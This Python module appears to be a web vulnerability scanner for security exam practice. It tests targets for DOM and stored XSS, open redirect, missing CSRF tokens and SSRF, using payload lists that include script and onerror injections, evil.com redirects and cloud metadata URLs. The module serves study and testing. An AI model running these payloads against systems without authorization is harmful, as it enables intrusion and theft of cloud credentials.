"""
Advanced vulnerability tests for PortSwigger exam prep:
DOM-based XSS, open redirect, CSRF, SSRF, and stored XSS via browser.
"""

import hashlib
import re
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urlencode


# ============================================================================
# DOM-based XSS detection via Playwright
# ============================================================================

DOM_XSS_PAYLOADS = [
    {"name": "dom_write", "payload": "<script>document.write('DOM_XSS_TEST_MARKER')</script>", "sink": "document.write"},
    {"name": "dom_innerhtml", "payload": "<img src=x onerror='document.body.innerHTML+=\"DOM_XSS_TEST_MARKER\"'>", "sink": "onerror"},
    {"name": "dom_prompt", "payload": "<script>prompt('DOM_XSS_PROMPT')</script>", "sink": "prompt"},
    {"name": "dom_alert", "payload": "<script>alert('DOM_XSS_ALERT')</script>", "sink": "alert"},
    {"name": "dom_location", "payload": "<script>document.location='http://xss-test-marker'</script>", "sink": "document.location"},
    {"name": "dom_hash", "payload": "#<img src=x onerror='document.body.innerHTML+=\"DOM_XSS_HASH_TEST\"'>", "sink": "location.hash"},
    {"name": "dom_svg", "payload": "<svg onload='document.body.innerHTML+=\"DOM_XSS_SVG\"'>", "sink": "svg_onload"},
]


def test_dom_xss_browser(page: Any, base_url: str,
                         test_urls: Optional[List[Dict]] = None) -> List[Dict]:
    """Test for DOM-based XSS by injecting payloads and monitoring JS execution."""
    findings = []
    if not page:
        return findings

    urls_to_test = test_urls or [
        {"url": f"{base_url}/", "param": None},
        {"url": f"{base_url}/search?q=", "param": "q"},
    ]

    for test in urls_to_test:
        base_test_url = test["url"]
        param = test.get("param")

        for p in DOM_XSS_PAYLOADS:
            if param and "{" in base_test_url:
                url = base_test_url.format(payload=p["payload"])
            elif param:
                url = f"{base_test_url}{urlencode({param: p['payload']})}"
            else:
                url = base_test_url + p["payload"]

            dialog_detected = {"value": False}
            innerhtml_hit = {"value": False}

            def make_on_dialog(d):
                def handler(dialog):
                    if dialog.type == "alert":
                        d["value"] = True
                    try:
                        dialog.dismiss()
                    except Exception:
                        pass
                return handler

            on_dialog_handler = make_on_dialog(dialog_detected)

            try:
                page.goto(url, wait_until="domcontentloaded", timeout=10000)
                page.on("dialog", on_dialog_handler)

                # Inject mutation observer
                try:
                    page.evaluate("""() => {
                        const observer = new MutationObserver((mutations) => {
                            for (const m of mutations) {
                                for (const node of m.addedNodes) {
                                    if (node.nodeType === 1 && node.innerHTML) {
                                        if (String(node.innerHTML).indexOf('DOM_XSS') !== -1) {
                                            window.__dom_xss_flag = true;
                                        }
                                    }
                                }
                            }
                        });
                        observer.observe(document.body, { childList: true, subtree: true, characterData: true });
                    }""")
                except Exception:
                    pass

                page.wait_for_timeout(2000)

                # Check page content
                marker_in_page = False
                try:
                    page_content = page.content()
                    marker_in_page = "DOM_XSS" in page_content
                except Exception:
                    pass

                # Check innerHTML flag
                try:
                    innerhtml_hit["value"] = page.evaluate(
                        "() => window.__dom_xss_flag === true"
                    )
                except Exception:
                    pass

                dialog_hit = dialog_detected["value"]

            except Exception:
                pass
            finally:
                try:
                    page.remove_listener("dialog", on_dialog_handler)
                except Exception:
                    pass

            if dialog_hit or marker_in_page or innerhtml_hit["value"]:
                findings.append({
                    "vulnerability": "XSS (DOM-based)",
                    "subtype": p["sink"],
                    "endpoint": base_test_url,
                    "payload_name": p["name"],
                    "payload": p["payload"][:100],
                    "evidence": {
                        "dialog_triggered": dialog_hit,
                        "marker_in_page": marker_in_page,
                        "innerhtml_modified": innerhtml_hit["value"],
                        "sink": p["sink"],
                    },
                    "confidence": "high" if dialog_hit else "medium",
                })

    return findings


# ============================================================================
# Open redirect detection
# ============================================================================

OPEN_REDIRECT_PAYLOADS = [
    {"name": "github", "payload": "https://github.com", "external": True},
    {"name": "evil-com", "payload": "https://evil.com", "external": True},
    {"name": "data-uri", "payload": "data:text/html,<script>alert(1)</script>", "external": True},
    {"name": "javascript-uri", "payload": "javascript:alert(1)", "external": True},
    {"name": "localhost", "payload": "http://localhost:3000", "external": False},
    {"name": "protocol-relative", "payload": "//evil.com", "external": True},
]

TRUSTED_REDIRECT_DOMAINS = ["localhost", "127.0.0.1", "juice-shop", "owasp.org"]


def is_trusted_redirect_target(payload: str, base_url: str) -> bool:
    from urllib.parse import urlparse
    try:
        parsed = urlparse(payload)
        hostname = (parsed.hostname or "").lower()
        if not hostname:
            return False
        for trusted in TRUSTED_REDIRECT_DOMAINS:
            if trusted in hostname:
                return True
        return False
    except Exception:
        return False


def test_open_redirect(injector: Any, base_url: str,
                       endpoints: List[Dict], max_endpoints: int = 5) -> List[Dict]:
    """Test URL parameters for open redirect vulnerability."""
    findings = []

    redirect_keywords = ["redirect", "return", "return_to", "next", "url", "dest",
                         "destination", "goto", "link", "out", "site", "target", "to",
                         "r_url", "redirect_uri", "callback"]
    candidates = []
    for ep in endpoints:
        url_lower = ep.url.lower()
        if any(kw in url_lower for kw in redirect_keywords):
            candidates.append(ep)
        for inp in (ep.inputs or []):
            if any(kw in inp.get("name", "").lower() for kw in redirect_keywords):
                if ep not in candidates:
                    candidates.append(ep)

    test_eps = candidates[:max_endpoints] if candidates else endpoints[:max_endpoints]

    for ep in test_eps:
        for inp in (ep.inputs or []):
            if inp.get("type") not in ("url_param", "text"):
                continue
            param_name = inp["name"]
            for p in OPEN_REDIRECT_PAYLOADS:
                payload = p["payload"]
                resp = injector.inject_get(ep.url, param_name, payload)
                status = resp.get("status_code", 0)
                headers = resp.get("headers", {})
                body = resp.get("body", "")

                location = headers.get("location", "")
                refresh = headers.get("refresh", "")
                meta_refresh = re.findall(
                    r'<meta\s+http-equiv=["\']refresh["\']\s+content=["\']?\d+;\s*url=([^"\'\s>]+)',
                    body, re.IGNORECASE)
                js_redirect = re.findall(
                    r'(?:window\.location|document\.location)\s*=\s*["\']([^"\']+)',
                    body, re.IGNORECASE)

                redirect_target = ""
                if status in (301, 302, 303, 307, 308) and location:
                    redirect_target = location
                elif refresh and "evil" in refresh.lower():
                    redirect_target = refresh
                elif meta_refresh:
                    redirect_target = meta_refresh[0]
                elif js_redirect:
                    redirect_target = js_redirect[0]
                elif payload.lower() in body.lower() and p.get("external"):
                    redirect_target = payload

                if not redirect_target:
                    continue
                if is_trusted_redirect_target(redirect_target, base_url):
                    continue

                findings.append({
                    "vulnerability": "Open Redirect",
                    "subtype": "external" if p.get("external") else "server-side",
                    "endpoint": ep.url,
                    "parameter": param_name,
                    "payload": payload,
                    "redirect_target": redirect_target,
                    "evidence": {
                        "status_code": status,
                        "redirect_detected": True,
                        "redirect_location": redirect_target,
                    },
                    "confidence": "high" if status in (301, 302, 303, 307, 308) else "medium",
                })
                break

    return findings


# ============================================================================
# CSRF token analysis
# ============================================================================

CSRF_KEYWORDS = ["csrf", "_token", "authenticity_token", "xsrf", "crumb",
                  "security_token", "form_token", "request_token", "anti_csrf"]


def analyze_csrf_endpoints(endpoints: List[Dict]) -> List[Dict]:
    """Analyze form endpoints for missing CSRF protection."""
    findings = []
    for ep in endpoints:
        if ep.method != "POST":
            continue
        inputs = ep.inputs or []
        input_names = [inp.get("name", "") for inp in inputs]
        has_csrf = any(any(kw in name.lower() for kw in CSRF_KEYWORDS) for name in input_names)
        has_hidden = any(inp.get("type") == "hidden" for inp in inputs)
        if not has_csrf and not has_hidden:
            findings.append({
                "vulnerability": "CSRF",
                "subtype": "POST form without CSRF token",
                "endpoint": ep.url,
                "form_action": ep.form_action or ep.url,
                "inputs": input_names,
                "evidence": {
                    "no_csrf_token_detected": True,
                    "no_hidden_fields": not has_hidden,
                    "input_names": input_names,
                },
                "confidence": "low",
            })
    return findings


# ============================================================================
# SSRF detection (basic)
# ============================================================================

SSRF_PAYLOADS = [
    {"name": "localhost", "payload": "http://127.0.0.1", "type": "internal"},
    {"name": "localhost-host", "payload": "http://localhost", "type": "internal"},
    {"name": "metadata-aws", "payload": "http://169.254.169.254/latest/meta-data/", "type": "cloud_metadata"},
    {"name": "metadata-gcp", "payload": "http://metadata.google.internal/computeMetadata/v1/", "type": "cloud_metadata"},
    {"name": "decimal-ip", "payload": "http://2130706433", "type": "internal"},
    {"name": "redis", "payload": "http://127.0.0.1:6379", "type": "internal_port"},
    {"name": "mysql", "payload": "http://127.0.0.1:3306", "type": "internal_port"},
    {"name": "elastic", "payload": "http://127.0.0.1:9200", "type": "internal_port"},
    {"name": "dns-rebind", "payload": "http://127.0.0.1.nip.io", "type": "dns_rebind"},
]

SSRF_INDICATORS = ["amazon", "ec2", "metadata", "userdata", "redis", "mysql",
                    "postgresql", "elastic", "169.254", "nip.io"]


def test_ssrf(injector: Any, base_url: str, endpoints: List[Dict],
              max_endpoints: int = 3, max_payloads: int = 5) -> List[Dict]:
    """Test URL parameters for SSRF vulnerability."""
    findings = []

    keywords = ["webhook", "callback", "fetch", "proxy", "import", "url",
                "link", "img", "src", "feed", "rss", "request"]
    candidates = []
    for ep in endpoints:
        url_lower = ep.url.lower()
        if any(kw in url_lower for kw in keywords):
            candidates.append(ep)
        for inp in (ep.inputs or []):
            if any(kw in inp.get("name", "").lower() for kw in keywords):
                if ep not in candidates:
                    candidates.append(ep)

    test_eps = candidates[:max_endpoints] if candidates else endpoints[:max_endpoints]
    payloads = SSRF_PAYLOADS[:max_payloads]

    for ep in test_eps:
        for inp in (ep.inputs or []):
            if inp.get("type") not in ("url_param", "text"):
                continue
            param_name = inp["name"]
            for p in payloads:
                payload = p["payload"]
                resp = injector.inject_get(ep.url, param_name, payload)
                status = resp.get("status_code", 0)
                body = resp.get("body", "").lower()

                for indicator in SSRF_INDICATORS:
                    if indicator in body:
                        findings.append({
                            "vulnerability": "Server-Side Request Forgery",
                            "subtype": p.get("type", "unknown"),
                            "endpoint": ep.url,
                            "parameter": param_name,
                            "payload": payload,
                            "indicator": indicator,
                            "evidence": {
                                "status_code": status,
                                "body_preview": resp.get("body", "")[:200],
                            },
                            "confidence": "high" if p.get("type") == "cloud_metadata" else "medium",
                        })
                        break
    return findings


# ============================================================================
# Stored XSS via browser
# ============================================================================

STORED_PAYLOADS = [
    {"name": "stored_img", "payload": "<img src=x onerror=alert('STORED_XSS')>"},
    {"name": "stored_script", "payload": "<script>alert('STORED_XSS')</script>"},
    {"name": "stored_svg", "payload": "<svg onload=alert('STORED_XSS')>"},
]


def test_stored_xss_browser(page: Any, injector: Any, base_url: str,
                            form_endpoints: List[Dict]) -> List[Dict]:
    """Test for stored XSS by submitting payloads and checking display pages."""
    findings = []
    if not page:
        return findings

    for ep in form_endpoints[:3]:
        if ep.method != "POST":
            continue
        inputs = ep.inputs or []
        text_inputs = [inp for inp in inputs
                       if inp.get("type") in ("text", "textarea", "email", "search")]
        if not text_inputs:
            continue

        text_input = text_inputs[0]
        field_name = text_input["name"]
        submit_url = ep.form_action or ep.url

        for p in STORED_PAYLOADS:
            form_data = {}
            for inp in inputs:
                if inp["name"] == field_name:
                    form_data[inp["name"]] = p["payload"]
                else:
                    form_data[inp["name"]] = inp.get("value", "")

            resp = injector.inject_post_form(submit_url, inputs, field_name, p["payload"])
            if resp.get("status_code") not in (200, 201, 302, 303):
                continue

            display_urls = [f"{base_url}/#/inventory", f"{base_url}/#/basket"]
            for display_url in display_urls:
                try:
                    page.goto(display_url, wait_until="domcontentloaded", timeout=10000)
                    page.wait_for_timeout(1000)
                    content = page.content()
                    if "STORED_XSS" in content:
                        in_script = f"<script>{p['payload'][:30]}" in content
                        in_event = re.search(r'on\w+\s*=\s*"[^\"]*STORED_XSS', content, re.IGNORECASE)
                        findings.append({
                            "vulnerability": "XSS (Stored)",
                            "subtype": p["name"],
                            "endpoint": submit_url,
                            "display_page": display_url,
                            "payload_name": p["name"],
                            "payload": p["payload"][:100],
                            "evidence": {
                                "submission_status": resp.get("status_code"),
                                "found_on_page": True,
                                "in_script_context": in_script,
                                "in_event_handler": bool(in_event),
                            },
                            "confidence": "high" if in_script or in_event else "medium",
                        })
                        break
                except Exception:
                    pass
    return findings


# ============================================================================
# Consolidated advanced test runner
# ============================================================================

def run_advanced_tests(
    page: Any,
    injector: Any,
    base_url: str,
    endpoints: List[Dict],
    form_endpoints: List[Dict],
) -> List[Dict]:
    """Run all advanced vulnerability tests."""
    findings = []

    # 1. DOM-based XSS
    dom_findings = test_dom_xss_browser(page, base_url)
    findings.extend(dom_findings)

    # 2. Open redirect
    redirect_findings = test_open_redirect(injector, base_url, endpoints)
    findings.extend(redirect_findings)

    # 3. CSRF
    csrf_findings = analyze_csrf_endpoints(endpoints)
    findings.extend(csrf_findings)

    # 4. SSRF
    ssrf_findings = test_ssrf(injector, base_url, endpoints)
    findings.extend(ssrf_findings)

    # 5. Stored XSS
    stored_findings = test_stored_xss_browser(page, injector, base_url, form_endpoints)
    findings.extend(stored_findings)

    return findings
